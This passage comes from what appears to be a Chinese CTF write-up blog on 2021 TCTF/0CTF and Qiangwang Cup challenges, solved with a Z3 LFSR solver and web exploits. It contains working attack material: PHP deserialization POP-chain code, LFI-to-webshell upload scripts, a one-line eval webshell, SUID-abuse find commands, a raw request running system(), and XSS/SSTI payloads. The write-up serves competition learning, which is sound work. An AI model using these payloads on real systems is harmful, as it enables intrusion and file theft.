self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)] return o class Generator2: def __init__(self, key): assert len(key) == 64 self.NFSR = key[: 16] self.LFSR = key[16: ] self.TAP = [0, 35] self.f_IN = [0, 10, 20, 30, 40, 47] self.f_OUT = [[0, 1, 2, 3], [0, 1, 2, 4, 5], [0, 1, 2, 5], [0, 1, 2], [0, 1, 3, 4, 5], [0, 1, 3, 5], [0, 1, 3], [0, 1, 4], [0, 1, 5], [0, 2, 3, 4, 5], [ 0, 2, 3], [0, 3, 5], [1, 2, 3, 4, 5], [1, 2, 3, 4], [1, 2, 3, 5], [1, 2], [1, 3, 5], [1, 3], [1, 4], [1], [2, 4, 5], [2, 4], [2], [3, 4], [4, 5], [4], [5]] self.TAP2 = [[0, 3, 7], [1, 11, 13, 15], [2, 9]] self.h_IN = [0, 2, 4, 6, 8, 13, 14] self.h_OUT = [[0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6], [1, 3, 4]] def f(self): x = [self.LFSR[i] for i in self.f_IN] return _sum(_prod(x[i] for i in j) for j in self.f_OUT) def h(self): x = [self.NFSR[i] for i in self.h_IN] return _sum(_prod(x[i] for i in j) for j in self.h_OUT) def g(self): x = self.NFSR return _sum(_prod(x[i] for i in j) for j in self.TAP2) def clock(self): self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)] self.NFSR = self.NFSR[1: ] + [self.LFSR[1] ^ self.g()] return self.f() ^ self.h() class Generator3: def __init__(self, key: list): assert len(key) == 64 self.LFSR = key self.TAP = [0, 55] self.f_IN = [0, 8, 16, 24, 32, 40, 63] self.f_OUT = [[1], [6], [0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6]] def f(self): x = [self.LFSR[i] for i in self.f_IN] return _sum(_prod(x[i] for i in j) for j in self.f_OUT) def clock(self): self.LFSR = self.LFSR[1: ] + [_sum(self.LFSR[i] for i in self.TAP)] return self.f() class zer0lfsr: def __init__(self, msk: int, t: int): if t == 1: self.g = Generator1(n2l(msk, 64)) elif t == 2: self.g = Generator2(n2l(msk, 64)) else: self.g = Generator3(n2l(msk, 64)) self.t = t def next(self): for i in range(self.t): o = self.g.clock() return o class Task(socketserver.BaseRequestHandler): def __init__(self, *args, **kargs): super().__init__(*args, **kargs) def proof_of_work(self): random.seed(urandom(8)) proof = ''.join([random.choice(string.ascii_letters + string.digits + '!#$%&amp;*-?') for _ in range(20)]) digest = sha256(proof.encode()).hexdigest() self.dosend('sha256(XXXX + {}) == {}'.format(proof[4: ], digest)) self.dosend('Give me XXXX:') x = self.request.recv(10) x = (x.strip()).decode('utf-8') if len(x) != 4 or sha256((x + proof[4: ]).encode()).hexdigest() != digest: return False return True def dosend(self, msg): try: self.request.sendall(msg.encode('latin-1') + b'\\n') except: pass def timeout_handler(self, signum, frame): raise TimeoutError def handle(self): try: signal.signal(signal.SIGALRM, self.timeout_handler) signal.alarm(30) if not self.proof_of_work(): self.dosend('You must pass the PoW!') return signal.alarm(50) available = [1, 2, 3] for _ in range(2): self.dosend('which one: ') idx = int(self.request.recv(10).strip()) assert idx in available available.remove(idx) msk = random.getrandbits(64) lfsr = zer0lfsr(msk, idx) for i in range(5): keystream = '' for j in range(1000): b = 0 for k in range(8): b = (b &lt;&lt; 1) + lfsr.next() keystream += chr(b) self.dosend('start:::' + keystream + ':::end') hint = sha256(str(msk).encode()).hexdigest() self.dosend('hint: ' + hint) self.dosend('k: ') guess = int(self.request.recv(100).strip()) if guess != msk: self.dosend('Wrong ;(') self.request.close() else: self.dosend('Good :)') self.dosend(flag) except TimeoutError: self.dosend('Timeout!') self.request.close() except: self.dosend('Wtf?') self.request.close() class ThreadedServer(socketserver.ForkingMixIn, socketserver.TCPServer): pass if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 31337 server = ThreadedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 是辣个 线性反馈移位寄存器（LFSR），但又不是咱之前见过的那种。 这个貌似可以用 Fast Correlation Attacks（project）。 2019 年的 TCTF 就出过这样一题，0CTF/TCTF 2019 Quals - zer0lfsr. 他那题是静态的文件数据，没有和服务器的交互，写起来比较方便，求解也可以直接拿 Z3 solver 来实现了。 这题的话 Generator1 和 Generator3 比较简单，然而直接拿 Z3 发现整不通，会提示 unsupported format string passed to BitVecRef.__format__，也就是说 BitVec 不支持 format 操作。 比赛的时候看了一晚上这题不知道咋整，赛后看了人家大佬的 wp 才发现只需要重写一下 n2l 函数就完事了。 把这个改成位操作，用位与、移位操作来对每个 BitVec 进行操作，最后形成一个 BitVec 的 list。 另外在接收数据的处理上，只需要给前 200 位这样的结果建立方程组就能求解了，没必要全部加上。 （8000个方程太多了也没必要） Exp 如下。 \"\"\"MiaoTony\"\"\" from pwn import * from itertools import product from string import ascii_letters, digits from hashlib import sha256 from z3 import * def _prod(L): p = 1 for x in L: p *= x return p def _sum(L): s = 0 for x in L: s ^= x return s def n2l_(x, l): return list(map(int, '{{0:0{}b}}'.format(l).format(x))) def n2l(x, l): # need to rewrite n2l with bit computation ans = [] for i in range(l): ans.append(x &amp; 1) x = x &gt;&gt; 1 return ans[::-1] class Generator1: def __init__(self, key: list): # assert len(key) == 64 self.NFSR = key[: 48] self.LFSR = key[48:] self.TAP = [0, 1, 12, 15] self.TAP2 = [[2], [5], [9], [15], [22], [26], [39], [26, 30], [ 5, 9], [15, 22, 26], [15, 22, 39], [9, 22, 26, 39]] self.h_IN = [2, 4, 7, 15, 27] self.h_OUT = [[1], [3], [0, 3], [0, 1, 2], [0, 2, 3], [0, 2, 4], [0, 1, 2, 4]] def g(self): x = self.NFSR return _sum(_prod(x[i] for i in j) for j in self.TAP2) def h(self): x = [self.LFSR[i] for i in self.h_IN[:-1]] + [self.NFSR[self.h_IN[-1]]] return _sum(_prod(x[i] for i in j) for j in self.h_OUT) def f(self): return _sum([self.NFSR[0], self.h()]) def clock(self): o = self.f() self.NFSR = self.NFSR[1:] + [self.LFSR[0] ^ self.g()] self.LFSR = self.LFSR[1:] + [_sum(self.LFSR[i] for i in self.TAP)] return o class Generator2: def __init__(self, key): # assert len(key) == 64 self.NFSR = key[: 16] self.LFSR = key[16:] self.TAP = [0, 35] self.f_IN = [0, 10, 20, 30, 40, 47] self.f_OUT = [[0, 1, 2, 3], [0, 1, 2, 4, 5], [0, 1, 2, 5], [0, 1, 2], [0, 1, 3, 4, 5], [0, 1, 3, 5], [0, 1, 3], [0, 1, 4], [0, 1, 5], [0, 2, 3, 4, 5], [ 0, 2, 3], [0, 3, 5], [1, 2, 3, 4, 5], [1, 2, 3, 4], [1, 2, 3, 5], [1, 2], [1, 3, 5], [1, 3], [1, 4], [1], [2, 4, 5], [2, 4], [2], [3, 4], [4, 5], [4], [5]] self.TAP2 = [[0, 3, 7], [1, 11, 13, 15], [2, 9]] self.h_IN = [0, 2, 4, 6, 8, 13, 14] self.h_OUT = [[0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6], [1, 3, 4]] def f(self): x = [self.LFSR[i] for i in self.f_IN] return _sum(_prod(x[i] for i in j) for j in self.f_OUT) def h(self): x = [self.NFSR[i] for i in self.h_IN] return _sum(_prod(x[i] for i in j) for j in self.h_OUT) def g(self): x = self.NFSR return _sum(_prod(x[i] for i in j) for j in self.TAP2) def clock(self): self.LFSR = self.LFSR[1:] + [_sum(self.LFSR[i] for i in self.TAP)] self.NFSR = self.NFSR[1:] + [self.LFSR[1] ^ self.g()] return self.f() ^ self.h() class Generator3: def __init__(self, key: list): # assert len(key) == 64 self.LFSR = key self.TAP = [0, 55] self.f_IN = [0, 8, 16, 24, 32, 40, 63] self.f_OUT = [[1], [6], [0, 1, 2, 3, 4, 5], [0, 1, 2, 4, 6]] def f(self): x = [self.LFSR[i] for i in self.f_IN] return _sum(_prod(x[i] for i in j) for j in self.f_OUT) def clock(self): self.LFSR = self.LFSR[1:] + [_sum(self.LFSR[i] for i in self.TAP)] return self.f() class zer0lfsr: def __init__(self, msk: int, t: int): if t == 1: self.g = Generator1(n2l(msk, 64)) elif t == 2: self.g = Generator2(n2l(msk, 64)) else: self.g = Generator3(n2l(msk, 64)) self.t = t def next(self): for i in range(self.t): o = self.g.clock() return o context.log_level = 'debug' context.timeout = 10 r = remote('111.186.59.28', 31337) rec = r.recvline().strip().decode() suffix = rec.split(\"+ \")[1].split(\")\")[0] digest = rec.split(\"== \")[1] log.info(f\"suffix: {suffix}\\ndigest: {digest}\") for comb in product(ascii_letters + digits + '!#$%&amp;*-?', repeat=4): prefix = ''.join(comb) if sha256((prefix+suffix).encode()).hexdigest() == digest: print(prefix) break else: log.info(\"PoW failed\") r.sendlineafter(b\"Give me XXXX:\", prefix.encode()) for choice in [1, 3]: r.sendlineafter(b'which one: ', str(choice)) d = '' for i in range(5): x = r.recvuntil(\":::end\\n\").strip().lstrip( b'start:::').rstrip(b':::end').decode('latin-1') d += x # print(\"=====&gt; d:\", d) r.recvuntil(\"hint: \") hint = r.recvuntil(\"\\n\").strip().decode() print(\"=====&gt; hint:\", hint) r.recvuntil('k: \\n') s = Solver() msk1 = BitVec('msk1', 64) lfsr = zer0lfsr(msk1, choice) # for i in range(5): # keystream = '' # for j in range(1000): # b = 0 # for k in range(8): # b = (b &lt;&lt; 1) + lfsr.next() # keystream += chr(b) digits = [] for x in d: x = ord(x) for i in range(8): digit = 1 if (x &amp; 0b10000000) &gt; 0 else 0 x &lt;&lt;= 1 digits.append(digit) # print(digit, x) # s.add(digit == lfsr.next()) print('[+] Receive OK!') for i in range(200): s.add(digits[i] == lfsr.next()) s.check() print(s.model()) msk = s.model()[msk1] assert sha256(str(msk).encode()).hexdigest() == hint r.sendline(str(msk)) r.interactive() flag{we_have_tried_our_best_to_prevent_the_use_of_z3} 好家伙，原来是你们故意的啊，坏坏！ 另外，发现一个有意思的地方。 用 latin-1 进行编码不会改变字符的长度，而用 utf-8 编码就可能会使得长度增大。 这情况在之前也遇到过，于是处理的时候就要特别小心，正好发现 2019 TCTF zer0lfsr 一题也有这个情况。 原因是进行 utf-8 编码，当 chr 操作的数字 &lt;= 127 时可以正常用 1byte 表示，而 python2 大于 127 会报错，python3 会使用 2bytes 进行表示。 # 在区间[128, 192)内,数字的表示形式会加上xc2前缀: &gt;&gt;&gt; chr(130).encode() b'\\xc2\\x80' # 在区间[192, 255)内,数字的表示形式会加上xc3前缀,同时数字本身减去64: &gt;&gt;&gt; chr(200).encode() b'\\xc3\\x88' 解码脚本： 最简单的就是直接以 bytes 都进来，直接 decode 即可。 # python3环境下 with open('keystream','rb') as f: data = f.read() data = data.decode() # python2环境下 import codecs with codecs.open('keystream', 'rb', 'utf8') as f: data = f.read() 复杂一点就手动根据前缀来解码（参考网上的） #!/usr/bin/python3 b = b'' with open('keystream','rb') as f: data = f.read() i = 0 while i &lt; len(data): if data[i] == 194: b += bytes([data[i+1]]) i += 1 elif data[i] == 195: b += bytes([data[i+1] + 64]) i += 1 else: b += bytes([data[i]]) i += 1 Extensive Reading: 深入分析CTF中的LFSR类题目（二） LFSR原理及CTF相关(一) CTF竞赛密码学 之 LFSR CTF | 2020 CISCN初赛 Z3&amp;LFSR WriteUp Web1linephp http://111.186.59.2:50080 http://111.186.59.2:50081 http://111.186.59.2:50082 The three servers are the same, you can choose any one. server will be reset every 10 minutes. 源码： &lt;?php ($_=@$_GET['yxxx'].'.php') &amp;&amp; @substr(file($_)[0],0,6) === '@&lt;?php' ? include($_) : highlight_file(__FILE__) &amp;&amp; include('phpinfo.html'); 这题是 HITCON2018 One Line PHP Challenge 的升级版。 那题的源码是 ($_=@$_GET['orange']) &amp;&amp; @substr(file($_)[0],0,6) === '@&lt;?php' ? include($_) : highlight_file(__FILE__); 这题其实就文件名加了个 .php 。 参考 hitcon2018 One Line PHP Challenge hitcon 2018 One Line PHP Challenge 利用session.upload_progress进行文件包含 phpinfo with LFI 利用 PHP upload_progress 进行文件包含来上传文件并执行。 先看一看 session 相关的配置。 session.auto_start = Off，代码如果没有 session_start() 也是没有开启 session 的，但是如果在多部分的 POST 数据里加入 PHP_SESSION_UPLOAD_PROGRESS 字段就可以开启 session 了。 session.upload_progress.cleanup = On ，文件上传后，session 文件内容会被立即清空，于是要进行条件竞争，传一个大文件来拖时间，在清空之前包含该文件。 到这里就是之前那题就可以解了。 而这题的话，利用 zip:// 协议可以在包含的时候包含压缩包里的文件，这样就能在拼接 .php 的时候读取到需要的 php 文件了。 然而还需要一个 zip 的 trick。 由于 PHP 在进行 zip 文件读取的时候是从结尾的部分读偏移量，然后从开头+偏移量的位置开始读取，于是就构造一个 zip，跳过 upload_progress_ 来读取就完事了。 赛后发现有另一种方案，就是先在压缩包里放一个文件，然后通过命令行给压缩包附加上所需的 php 木马文件，也就是说，这样 php🐎 所存储的位置不会被破坏掉，能通过 php zip 协议正常解析。然后打过去就完事了。 下面是队友的 Writeup： 很明显是 hitcon 那个 oneline php ，复习一下 wp ，然后发现多了一个 php 后缀，对于这个点尝试了 phar/zip LFI 都不太行，最后看 zip 格式的时候，发现 zip 是从后往前读的，类似指针的构造，所以我们构造一个 zip 文件，然后修改一下，刚好upload_progress_是 16 字节，只需要把 zip 那几个段的偏移加 16 字节，挪一下就可以了。 然后用 burp 一边用zip:///tmp/sess_b#index包含这个 zip 文件，一边用 php upload progress 刷新 session ，写马进去就可以了。 worldcup这题是队友写的 wp，后面环境关了喵喵复现不了了（ 在修改昵称处用/*尝试多行注释的时候，发现得到的内容都被删除了，猜想有可能是服务端渲染，又因为是 golang ，搜了一下发现有： https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html 尝试先用 {{.}} 试试看，发现在主页成功输出 const msg = [ { name: \"map[_nonce:ttJVZSLyh5Us2Gx1gLzALQ code:fadc1d lv:1 msg:\\u0022\\u0027*\\/`s name:zedd1]\", } ] const ParseMSG = (d) =&gt; { if (d['name'] != \"map[_nonce:ttJVZSLyh5Us2Gx1gLzALQ code:fadc1d lv:1 msg:\\u0022\\u0027*\\/`s name:zedd1]\") return `${d['name']}(quota ${d['quota'] != -1 ? d['used'] + \"/\" + d['quota'] : 'unlimited'}): ${d['msg']}`; else return `Your quota: 1, Nickname: {\"_nonce\":\"ttJVZSLyh5Us2Gx1gLzALQ\",\"code\":\"fadc1d\",\"lv\":1,\"msg\":\"\\\"'*/`s\",\"name\":\"zedd1\"}`; }; for (let i = 0; i &lt; 5; ++i) $(\"#msg\").append('&lt;div class=\"form-group row\"&gt;&lt;p&gt;' + ParseMSG(msg[i]) + '&lt;/p&gt;&lt;/div&gt;'); $(\"#newmsg\").text('(quota 1/1): \\u0022\\u0027*\\/`s'); 发现在return语句中可以尝试使用反引号闭合，所以我们只需要改一下 msg 的内容就好了。 改成 {\"msg\":\"`+alert()+`\"} 就能弹窗了，所以接下来就是 xss 了，直接window.location跳就行了。 拿到 level1 cookie 之后，访问 level2 ，但是好像可以直接 X ，不知道设置的意义在哪 $(\"#newmsg\").text(`\"`+alert()+`\"`); 拿到两个 cookie level1=NoQWeCy70QekDB5b; level2=Autx5F53FmmSFayM 访问 http://111.186.58.249:19260/casino?bet=1 用{{$}}可以看到变量名，然后看了一下 text 模板文档，一开始用 {{if%20gt%20.o0ps_u_Do1nt_no_t1%20.o0ps_u_Do1nt_no_t2}}{{printf%201}}{{else}}{{printf%200}}{{end}} 前端赢麻了但是后端不加钱，然后陷入脑洞当中。 后来想到可能是先加载的模版，再更新钱，于是想个办法把错的时候搞崩就行了。 0{{if%20gt%20.o0ps_u_Do1nt_no_t1%20.o0ps_u_Do1nt_no_t2}}{{call%201}}{{end}} 然后就可以稳赢了。 小结这比赛题目太难了啊！！！ 喵喵好菜啊，喵呜呜呜！！！ 哭了，队友大多在准备期末考试，都没什么师傅来一起玩。。 最后只打到了 RisingStar Scoreboard 第13，然而前 12 进决赛，太难受啦，喵呜呜呜！ 总榜 （溜了溜了喵","path":"2021/07/15/CTF_2021TCTF-0CTF/"},{"title":"CTF | 2021 强网杯线上赛 Web&Misc WriteUp","text":"本文首发于安全客：https://www.anquanke.com/post/id/244824 引言 第五届强网杯全国网络安全挑战赛 - 线上赛 比赛时间: 2021-06-12 09:00 ~ 2021-06-13 21:00 比赛官网: https://www.ichunqiu.com/2021qwb 这比赛时长36h，包括签到和问卷总共43题，太顶啦！ 大部分都是和队里师傅们一起打的，有些题目自己看了其中一部分，赛后又稍微复现了一下。 Web[强网先锋]寻宝有两关 线索1 &lt;?php header('Content-type:text/html;charset=utf-8'); error_reporting(0); highlight_file(__file__); function filter($string){ $filter_word = array('php','flag','index','KeY1lhv','source','key','eval','echo','\\$','\\(','\\.','num','html','\\/','\\,','\\'','0000000'); $filter_phrase= '/'.implode('|',$filter_word).'/'; return preg_replace($filter_phrase,'',$string); } if($ppp){ unset($ppp); } $ppp['number1'] = \"1\"; $ppp['number2'] = \"1\"; $ppp['nunber3'] = \"1\"; $ppp['number4'] = '1'; $ppp['number5'] = '1'; extract($_POST); $num1 = filter($ppp['number1']); $num2 = filter($ppp['number2']); $num3 = filter($ppp['number3']); $num4 = filter($ppp['number4']); $num5 = filter($ppp['number5']); if(isset($num1) &amp;&amp; is_numeric($num1)){ die(\"非数字\"); } else{ if($num1 &gt; 1024){ echo \"第一层\"; if(isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000){ echo \"第二层\"; if(isset($num3) &amp;&amp; '4bf21cd' === substr(md5($num3),0,7)){ echo \"第三层\"; if(!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4) ){ echo \"第四层\"; if(!isset($num5)||(strlen($num5)==0)) die(\"no\"); $b=json_decode(@$num5); if($y = $b === NULL){ if($y === true){ echo \"第五层\"; include 'KeY1lhv.php'; echo $KEY1; } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no\"); } }else{ die(\"no111\"); } } Payload: ppp[number1]=2333m&amp;ppp[number2]=1e10&amp;ppp[number3]=61823470&amp;ppp[number4]=-aabcdf&amp;ppp[number5]=null KEY1{e1e1d3d40573127e9ee0480caf1283d6} 线索2 文件下载几秒会自动掐断，考虑断点续传，用 IDM 直接就能实现。 打开一堆的 docx，里面一堆垃圾 ASCII，写个脚本把所有 docx 文件读一下。 import os import docx import glob files = glob.glob('.\\\\five_month\\\\*\\\\*\\\\*.docx') print(files) for file in files: doc = docx.Document(file) for i in doc.paragraphs: try: # print(i.text) if 'KEY2' in i.text: print(i.text) print('============================') except: pass 其中有个就是KEY2 KEY2{T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS} 提交拿到 flag （这样套娃太恶心了 [强网先锋]赌徒源码： &lt;meta charset=\"utf-8\"&gt; &lt;?php //hint is in hint.php error_reporting(1); class Start { public $name='guest'; public $flag='syst3m(\"cat 127.0.0.1/etc/hint\");'; public function __construct(){ echo \"I think you need /etc/hint . Before this you need to see the source code\"; } public function _sayhello(){ echo $this-&gt;name; return 'ok'; } public function __wakeup(){ echo \"hi\"; $this-&gt;_sayhello(); } public function __get($cc){ echo \"give you flag : \".$this-&gt;flag; return ; } } class Info { private $phonenumber=123123; public $promise='I do'; public function __construct(){ $this-&gt;promise='I will not !!!!'; return $this-&gt;promise; } public function __toString(){ return $this-&gt;file['filename']-&gt;ffiillee['ffiilleennaammee']; } } class Room { public $filename='/flag'; public $sth_to_set; public $a=''; public function __get($name){ $function = $this-&gt;a; return $function(); } public function Get_hint($file){ $hint=base64_encode(file_get_contents($file)); echo $hint; return ; } public function __invoke(){ $content = $this-&gt;Get_hint($this-&gt;filename); echo $content; } } if(isset($_GET['hello'])){ unserialize($_GET['hello']); }else{ $hi = new Start(); } ?&gt; Room 里可以读取文件并输出，但是需要以调用函数的方式调用这个对象。正好里面的 __get() 方法当调用对象中不存在的属性或者私有的属性的时候就能触发调用他自己。 再看 Info 对象里的 __toString 就可以调用一个 Room 里不存在的对象 ffiillee['ffiilleennaammee']。 为了实现输出 Info，看到 Start 里反序列化的时候会调用 _sayhello() 方法。 于是让 Start-&gt;name 指向 Info，Info-&gt;file['filename'] 指向 Room，然后以调用函数的方式调用 Room，Room-&gt;filename = '/flag' 就能输出 flag 了。 （这里说的对象还要实例化一下 Exp： &lt;?php error_reporting(1); class Start { public $name; } class Info { private $phonenumber = 123123; public $promise = 'I do'; } class Room { public $filename = '/flag'; public $sth_to_set; public $a = ''; } $c = new Room(); $d = new Room(); $d-&gt;filename = '/flag'; $a = new Start(); $b = new Info(); $b-&gt;file['filename'] = $c; $a-&gt;name = $b; $c-&gt;a = $d; echo urlencode(serialize($a)); ?&gt; WhereIsUWebShell源码 &lt;!-- You may need to know what is in e2a7106f1cc8bb1e1318df70aa0a3540.php--&gt; &lt;?php // index.php ini_set('display_errors', 'on'); if(!isset($_COOKIE['ctfer'])){ setcookie(\"ctfer\",serialize(\"ctfer\"),time()+3600); }else{ include \"function.php\"; echo \"I see your Cookie&lt;br&gt;\"; $res = unserialize($_COOKIE['ctfer']); if(preg_match('/myclass/i',serialize($res))){ throw new Exception(\"Error: Class 'myclass' not found \"); } } highlight_file(__FILE__); echo \"&lt;br&gt;\"; highlight_file(\"myclass.php\"); echo \"&lt;br&gt;\"; highlight_file(\"function.php\"); &lt;?php // myclass.php class Hello{ public function __destruct() { if($this-&gt;qwb) echo file_get_contents($this-&gt;qwb); } } ?&gt; &lt;?php // function.php function __autoload($classname){ require_once \"/var/www/html/$classname.php\"; } ?&gt; 入口的 COOKIE 存在反序列化 去掉最后的大括号，利用反序列化报错来防止进入 Exception O:7:\"myclass\":1:{s:1:\"h\";O:5:\"Hello\":1:{s:3:\"qwb\";s:36:\"e2a7106f1cc8bb1e1318df70aa0a3540.php\";} O%3A7%3A%22myclass%22%3A1%3A%7Bs%3A1%3A%22h%22%3BO%3A5%3A%22Hello%22%3A1%3A%7Bs%3A3%3A%22qwb%22%3Bs%3A36%3A%22e2a7106f1cc8bb1e1318df70aa0a3540%2Ephp%22%3B%7D e2a7106f1cc8bb1e1318df70aa0a3540.php &lt;?php include \"bff139fa05ac583f685a523ab3d110a0.php\"; include \"45b963397aa40d4a0063e0d85e4fe7a1.php\"; $file = isset($_GET['72aa377b-3fc0-4599-8194-3afe2fc9054b'])?$_GET['72aa377b-3fc0-4599-8194-3afe2fc9054b']:\"404.html\"; $flag = preg_match(\"/tmp/i\",$file); if($flag){ PNG($file); } include($file); $res = @scandir($_GET['dd9bd165-7cb2-446b-bece-4d54087185e1']); if(isset($_GET['dd9bd165-7cb2-446b-bece-4d54087185e1'])&amp;&amp;$_GET['dd9bd165-7cb2-446b-bece-4d54087185e1']==='/tmp'){ $somthing = GenFiles(); $res = array_merge($res,$somthing); } shuffle($res); @print_r($res); ?&gt; bff139fa05ac583f685a523ab3d110a0.php &lt;?php function PNG($file) { if(!is_file($file)){die(\"我从来没有见过侬\");} $first = imagecreatefrompng($file); if(!$first){ die(\"发现了奇怪的东西2333\"); } $size = min(imagesx($first), imagesy($first)); unlink($file); $second = imagecrop($first, ['x' =&gt; 0, 'y' =&gt; 0, 'width' =&gt; $size, 'height' =&gt; $size]); if ($second !== FALSE) { imagepng($second, $file); imagedestroy($second);//销毁，清内存 } imagedestroy($first); } ?&gt; 45b963397aa40d4a0063e0d85e4fe7a1.php &lt;?php function GenFiles(){ $files = array(); $str = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $len=strlen($str)-1; for($i=0;$i&lt;10;$i++){ $filename=\"php\"; for($j=0;$j&lt;6;$j++){ $filename .= $str[rand(0,$len)]; } // file_put_contents('/tmp/'.$filename,'flag{fake_flag}'); $files[] = $filename; } return $files; } ?&gt; /e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=passwd&amp;dd9bd165-7cb2-446b-bece-4d54087185e1=/tmp 当前应该是在 /etc 目录下（？ 不过没啥用，不能直接读 /flag，或者说 flag 不在根目录 参考 LFI via SegmentFault include.php?file=php://filter/string.strip_tags/resource=/etc/passwd 可以导致 php 在执行过程中 Segment Fault 本地文件包含漏洞可以让 php 包含自身从而导致死循环然后 php 就会崩溃 , 如果请求中同时存在一个上传文件的请求的话 , 这个文件就会被保留 魔改他的脚本 # -*- coding: utf-8 -*- import requests import string import itertools charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' base_url = \"http://eci-2ze9gh3z7jcw29alwhuz.cloudeci1.ichunqiu.com\" def upload_file_to_include(url, file_content): files = {'file': ('evil.jpg', file_content, 'image/jpeg')} try: response = requests.post(url, files=files) print(response) except Exception as e: print(e) def generate_tmp_files(): with open('miao.png', 'rb') as fin: file_content = fin.read() phpinfo_url = \"%s/e2a7106f1cc8bb1e1318df70aa0a3540.php?72aa377b-3fc0-4599-8194-3afe2fc9054b=php://filter/string.strip_tags/resource=passwd\" % ( base_url) length = 6 times = int(len(charset) ** (length / 2)) for i in range(times): print(\"[+] %d / %d\" % (i, times)) upload_file_to_include(phpinfo_url, file_content) def main(): generate_tmp_files() if __name__ == \"__main__\": main() 图片是个长宽相等的 png，里面放木马。 上传过程中就会留下一些文件不会被删除。 一边跑这个脚本，另一边的一堆 /tmp/phpxxxxxx 里就存在我们的 webshell 由于会自动删除，没了就换新的 根目录果然没 flag 然后利用 shell 发现 /usr/bin 下面有个文件可以以 root 权限执行命令 find / -user root -perm -4000 -print 2&gt;/dev/null # 或者 # find / -perm -u=s -type f 2&gt;/dev/null flag 在 /l1b 下一个绕来绕去的目录里面（恶心心 或者 find / -perm 600 -user root 最后执行 /usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/82a71a2d/e17e0f28/74cb5ced/8f93ff64/3396136a/Fl444ggg160b5c41 POST /e2a7106f1cc8bb1e1318df70aa0a3540.php?b822f88a-de15-4dc8-923b-1cbeec54bcfc=/tmp/phpi8bEt1&amp;0=system HTTP/1.1 Host: eci-2zehg7ugvk0ahcsnkehl.cloudeci1.ichunqiu.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: UM_distinctid=1769d95cb5b54d-04781d3935eefa-c791039-1fa400-1769d95cb5c669; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1611909425; ctfer=s%3A5%3A%22ctfer%22%3B; __jsluid_h=847d751b863f86e3ed743f9efb5d5c4f Connection: close Content-Length: 110 Content-Type: application/x-www-form-urlencoded 1=/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/82a71a2d/e17e0f28/74cb5ced/8f93ff64/3396136a/Fl444ggg160b5c41 flag{b101e657-a46a-4791-abcb-5be544fc12bd} EasyWeb 题目来源于某次帮朋友测试项目的渗透过程，非常非常简单，没有新的知识点，已经去掉了很多需要脑洞猜测的部分，不过依然需要进行一些信息收集工作。So~ Be Patient~And have funny! ​ 47.104.136.46​ 47.104.137.239​ 121.42.242.238 （每 20 分钟重启一次环境） flag不在数据库；1. 能看到报错信息是预期现象 直接访问，根据 html 里的提示访问 /hint，得知文件在 /files/???????????????????????????????? 访问 /file 下载得到相应的文件 根据里面的 hint.txt，扫描端口得到 http://121.42.242.238:36842 Try to scan 35000-40000 ^_^. All tables are empty except for the table where the username and password are located Table: employee sql 注入得到登录信息为 admin、99f609527226e076d668668582ac4420 扫目录得到 /file 有文件上传 直接上传会被卡 改文件名为 php.php 可以绕过 然后文件内容绕过，先用段标签和 $_GET[1] 绕过写小马，再通过 ?1=echo '&lt;?php @eval($_POST[m]);?&gt;' &gt; x.php 写马。 蚁剑连上之后发现权限不够，读不了 flag。 查看端口发现有个端口还跑着 jboss。 代理整出来，然后参考 jboss漏洞getshell 写 webshell，最后读到 flag。 （比赛结束之后环境关了也就么得图了 flag{V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3} EasyXSS The BOT starts every five seconds and handles only one reported URL at a time. The BOT is Google-Chrome 91.0.4472.77 (Official Build) (64-bit) Notice: the address requested by the BOT is http://localhost:8888. Each time the BOT processes a request, it clears subsequent report URLs from the database 每 15 分钟重启环境 47.104.192.54:888847.104.210.56:888847.104.155.242:8888 Hint: flag格式是flag{uuid} 算是个 XS-Leaks 的题目，算是侧信道的一种吧。 通过 /hint 路由可以知道 flag 判断逻辑。 app.all(\"/flag\", auth, async (req, res, next) =&gt; { if (req.session.isadmin &amp;&amp; typeof req.query.var === \"string\") { fs.readFile(\"/flag\", \"utf8\", (err, flag) =&gt; { let flagArray = flag.split(\"\"); let dataArray = req.query.var.split(\"\"); let check = true; for (let i = 0; i &lt; dataArray.length &amp;&amp; i &lt; flagArray.length; i++) { if (dataArray[i] !== flagArray[i]) { check = false; break; } } if (check) { res.status(200).send(req.query.var); } else { res.status(500).send(\"Keyword Error!\"); } }); } else { res.status(500).send(\"Sorry, you are not admin!\"); } }); /flag 路由对输入的逐个字符与 flag 的这么多个（输入的）长度的字符进行比较，如果每一位都相同则返回 200，否则返回 500. 于是可以利用 XSS 去让 bot 访问这个接口以 admin 来验证。 访问 /about?theme=xxxxx 发现存在 XSS。不过过滤了一些东西，比如 空格可以用 %09 绕过之类。 根据提示 flag 是个 UUID，于是可以按照这个格式逐位爆破，通过返回的状态来判断当前字符是否正确。 于是就在 VPS 